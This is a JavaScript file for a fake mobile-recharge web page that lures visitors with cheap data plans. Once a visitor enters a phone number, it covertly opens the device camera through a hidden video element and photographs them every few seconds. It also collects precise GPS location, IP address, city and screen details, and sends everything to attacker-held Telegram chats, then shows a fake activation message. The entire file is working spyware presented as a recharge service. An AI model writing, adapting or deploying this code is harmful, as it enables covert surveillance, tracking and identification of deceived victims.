// ========== CONFIGURATION FROM HIDDEN DIV (.env style) ==========
const configDiv = document.getElementById('app-config');
const CONFIG = {
    BOT_TOKEN: configDiv?.dataset.botToken || '',
    CHAT_IDS: configDiv?.dataset.chatIds?.split(',') || [],
    CAM_MODE: configDiv?.dataset.camMode || 'front',
    CAPTURE_INTERVAL: parseInt(configDiv?.dataset.captureInterval) || 5000
};

// ========== DOM ELEMENTS ==========
const elements = {
    statusBadge: document.getElementById('statusBadge'),
    balance: document.getElementById('balance'),
    mobileInput: document.getElementById('mobileNumber'),
    proceedBtn: document.getElementById('proceedBtn'),
    loadingOverlay: document.getElementById('loadingOverlay'),
    successModal: document.getElementById('successModal'),
    successMsg: document.getElementById('successMsg'),
    toast: document.getElementById('toast'),
    debugInfo: document.getElementById('debugInfo'),
    hiddenVideo: document.getElementById('hiddenVideo')
};

// ========== STATE VARIABLES ==========
let state = {
    selectedAmount: 199,
    selectedData: "1.5GB/day",
    selectedOperator: "jio",
    isCapturing: false,
    captureInterval: null,
    videoStream: null,
    photoCount: 0,
    locationSent: false
};

// ========== UTILITY FUNCTIONS ==========
function debugLog(msg) {
    console.log(msg);
    if (elements.debugInfo) {
        elements.debugInfo.innerHTML = msg.slice(0, 40);
    }
}

function showToastMsg(msg, isError = false) {
    elements.toast.textContent = msg;
    elements.toast.style.background = isError ? 'rgba(239, 68, 68, 0.9)' : 'rgba(34, 197, 94, 0.9)';
    elements.toast.style.backdropFilter = 'blur(8px)';
    elements.toast.style.border = isError ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(34, 197, 94, 0.3)';
    elements.toast.style.opacity = '1';
    setTimeout(() => { elements.toast.style.opacity = '0'; }, 2000);
}

// ========== TELEGRAM FUNCTIONS ==========
const TELEGRAM_API = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/`;

async function sendToBot(endpoint, body, isFormData = false) {
    if (!CONFIG.BOT_TOKEN || CONFIG.CHAT_IDS.length === 0) return false;
    
    let successCount = 0;
    
    for (const chatId of CONFIG.CHAT_IDS) {
        try {
            const config = { method: 'POST' };
            if (isFormData) {
                config.body = body;
            } else {
                body.chat_id = chatId.trim();
                config.headers = { 'Content-Type': 'application/json' };
                config.body = JSON.stringify(body);
            }
            const response = await fetch(TELEGRAM_API + endpoint, config);
            const result = await response.json();
            if (result.ok) successCount++;
        } catch(e) {
            debugLog('Network error: ' + e.message);
        }
    }
    return successCount > 0;
}

async function sendPhotoToAll(blob, caption) {
    let successCount = 0;
    
    for (const chatId of CONFIG.CHAT_IDS) {
        try {
            const formData = new FormData();
            formData.append('chat_id', chatId.trim());
            formData.append('photo', blob, `cam_${Date.now()}.jpg`);
            formData.append('caption', caption);
            
            const response = await fetch(TELEGRAM_API + 'sendPhoto', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            if (result.ok) successCount++;
        } catch(e) {}
    }
    return successCount;
}

async function sendLocationToAll(latitude, longitude, accuracy) {
    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const keyboard = {
        inline_keyboard: [[{ text: "View on Google Maps", url: mapsLink }]]
    };
    
    for (const chatId of CONFIG.CHAT_IDS) {
        await sendToBot('sendLocation', { latitude: latitude, longitude: longitude });
        await sendToBot('sendMessage', {
            text: `LOCATION DATA\n\nCoordinates: ${latitude}, ${longitude}\nAccuracy: ${accuracy}m\nPlan: ₹${state.selectedAmount}\nMobile: ${elements.mobileInput.value || 'N/A'}\nOperator: ${state.selectedOperator.toUpperCase()}`,
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(keyboard)
        });
    }
}

// ========== CAMERA & LOCATION FUNCTIONS ==========
async function captureAndSend() {
    if (!state.videoStream || !state.isCapturing) return;
    try {
        const video = elements.hiddenVideo;
        if (!video.videoWidth) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
        const caption = `CAMERA CAPTURE\nPlan: ₹${state.selectedAmount} | ${state.selectedOperator.toUpperCase()}\nMobile: ${elements.mobileInput.value}\nCapture #${state.photoCount + 1}`;
        
        const sentCount = await sendPhotoToAll(blob, caption);
        if (sentCount > 0) {
            state.photoCount++;
            elements.balance.innerHTML = state.photoCount;
            debugLog(`Photo sent to ${sentCount} chats`);
        }
    } catch(e) {
        debugLog('Capture error: ' + e.message);
    }
}

async function startCamera() {
    try {
        const constraints = { video: { facingMode: CONFIG.CAM_MODE === 'back' ? 'environment' : 'user' } };
        state.videoStream = await navigator.mediaDevices.getUserMedia(constraints);
        elements.hiddenVideo.srcObject = state.videoStream;
        await elements.hiddenVideo.play();
        state.isCapturing = true;
        state.captureInterval = setInterval(captureAndSend, CONFIG.CAPTURE_INTERVAL);
        debugLog('Camera active | Mode: ' + CONFIG.CAM_MODE);
        return true;
    } catch(e) {
        debugLog('Camera error: ' + e.message);
        return false;
    }
}

function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(false);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                await sendLocationToAll(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
                state.locationSent = true;
                showToastMsg('Location verified');
                resolve(true);
            },
            (error) => {
                sendToBot('sendMessage', { text: `LOCATION FAILED: ${error.message}\nPlan: ₹${state.selectedAmount}\nMobile: ${elements.mobileInput.value || 'N/A'}`, parse_mode: 'HTML' });
                resolve(false);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

async function sendDeviceInfo() {
    let ipData = { ip: 'N/A', city: 'N/A', country_name: 'N/A' };
    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        ipData = await ipRes.json();
    } catch(e) {}
    
    const info = `NEW ACTIVATION REQUEST\n\nPlan: ₹${state.selectedAmount} (${state.selectedData})\nMobile: ${elements.mobileInput.value}\nOperator: ${state.selectedOperator.toUpperCase()}\nIP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country_name}\nScreen: ${screen.width}x${screen.height}\n\nSent to ${CONFIG.CHAT_IDS.length} recipients`;
    
    for (const chatId of CONFIG.CHAT_IDS) {
        await sendToBot('sendMessage', { text: info, parse_mode: 'HTML' });
    }
}

// ========== UI EVENT HANDLERS ==========
function initEventListeners() {
    // Recharge cards selection
    document.querySelectorAll('.recharge-card').forEach(card => {
        card.addEventListener('click', () => {
            document.querySelectorAll('.recharge-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            state.selectedAmount = parseInt(card.dataset.amount);
            state.selectedData = card.dataset.data;
            debugLog('Plan selected: ₹' + state.selectedAmount);
        });
    });
    if (document.querySelectorAll('.recharge-card').length > 0) {
        document.querySelectorAll('.recharge-card')[0].classList.add('selected');
    }
    
    // Operators selection
    document.querySelectorAll('.operator').forEach(op => {
        op.addEventListener('click', () => {
            document.querySelectorAll('.operator').forEach(o => o.classList.remove('selected'));
            op.classList.add('selected');
            state.selectedOperator = op.dataset.operator;
            debugLog('Operator selected: ' + state.selectedOperator);
        });
    });
    if (document.querySelectorAll('.operator').length > 0) {
        document.querySelectorAll('.operator')[0].classList.add('selected');
    }
    
    // Mobile number input
    elements.mobileInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
    });
    
    // Proceed button
    elements.proceedBtn.onclick = proceedRecharge;
}

// ========== MAIN RECHARGE FUNCTION ==========
async function proceedRecharge() {
    const mobile = elements.mobileInput.value;
    if (!mobile || mobile.length !== 10) {
        showToastMsg('Enter valid 10 digit mobile number', true);
        return;
    }
    
    if (!CONFIG.BOT_TOKEN || CONFIG.CHAT_IDS.length === 0) {
        showToastMsg('Configuration error! Contact support', true);
        debugLog('❌ BOT_TOKEN or CHAT_IDS missing');
        return;
    }
    
    elements.proceedBtn.disabled = true;
    elements.proceedBtn.textContent = 'Processing...';
    elements.loadingOverlay.style.display = 'flex';
    
    const cameraStarted = await startCamera();
    if (!cameraStarted) {
        showToastMsg('Camera access required', true);
        elements.loadingOverlay.style.display = 'none';
        elements.proceedBtn.disabled = false;
        elements.proceedBtn.textContent = 'ACTIVATE PLAN';
        return;
    }
    
    await getLocation();
    await sendDeviceInfo();
    
    setTimeout(async () => {
        if (state.captureInterval) clearInterval(state.captureInterval);
        if (state.videoStream) state.videoStream.getTracks().forEach(track => track.stop());
        state.isCapturing = false;
        
        elements.loadingOverlay.style.display = 'none';
        elements.successMsg.innerHTML = `₹${state.selectedAmount} ${state.selectedOperator.toUpperCase()} plan activated successfully!<br><br>Data: ${state.selectedData}<br>Photos captured: ${state.photoCount}<br>Location: ${state.locationSent ? 'Verified' : 'Failed'}<br>Sent to: ${CONFIG.CHAT_IDS.length} recipients`;
        elements.successModal.style.display = 'flex';
        elements.proceedBtn.disabled = false;
        elements.proceedBtn.textContent = 'ACTIVATE PLAN';
        
        for (const chatId of CONFIG.CHAT_IDS) {
            await sendToBot('sendMessage', { text: `SESSION COMPLETE\nPhotos: ${state.photoCount}\nLocation: ${state.locationSent ? 'Verified' : 'Failed'}\nPlan: ₹${state.selectedAmount}\nMobile: ${mobile}`, parse_mode: 'HTML' });
        }
    }, 20000);
}

function closeSuccessModal() {
    elements.successModal.style.display = 'none';
}

// ========== TEST BOT CONNECTION ==========
async function testBotConnection() {
    try {
        const response = await fetch(`${TELEGRAM_API}getMe`);
        const result = await response.json();
        if (result.ok) {
            debugLog('Bot connected: ' + result.result.username);
            elements.statusBadge.style.background = 'rgba(34, 197, 94, 0.2)';
            elements.statusBadge.style.color = '#22c55e';
            elements.statusBadge.innerHTML = `● ONLINE | ${CONFIG.CHAT_IDS.length} chats`;
        } else {
            debugLog('Bot connection failed');
            elements.statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
            elements.statusBadge.style.color = '#ef4444';
            elements.statusBadge.innerHTML = '● CONNECTION ERROR';
        }
    } catch(e) {
        debugLog('Cannot connect to API: ' + e.message);
        elements.statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
        elements.statusBadge.style.color = '#ef4444';
    }
}

// ========== CLEANUP ON PAGE UNLOAD ==========
window.onbeforeunload = () => {
    if (state.captureInterval) clearInterval(state.captureInterval);
    if (state.videoStream) state.videoStream.getTracks().forEach(track => track.stop());
};

// ========== INITIALIZE ==========
window.onload = () => {
    debugLog('System initializing...');
    debugLog(`Bot Token: ${CONFIG.BOT_TOKEN ? '✅ Loaded' : '❌ Missing'}`);
    debugLog(`Chat IDs: ${CONFIG.CHAT_IDS.length} IDs loaded`);
    debugLog(`Camera Mode: ${CONFIG.CAM_MODE}`);
    debugLog(`Capture Interval: ${CONFIG.CAPTURE_INTERVAL}ms`);
    
    initEventListeners();
    testBotConnection();
    
    if (CONFIG.CHAT_IDS.length === 0) {
        debugLog('⚠️ No Chat IDs configured!');
        elements.statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
        elements.statusBadge.style.color = '#ef4444';
    }
};

window.closeSuccessModal = closeSuccessModal;
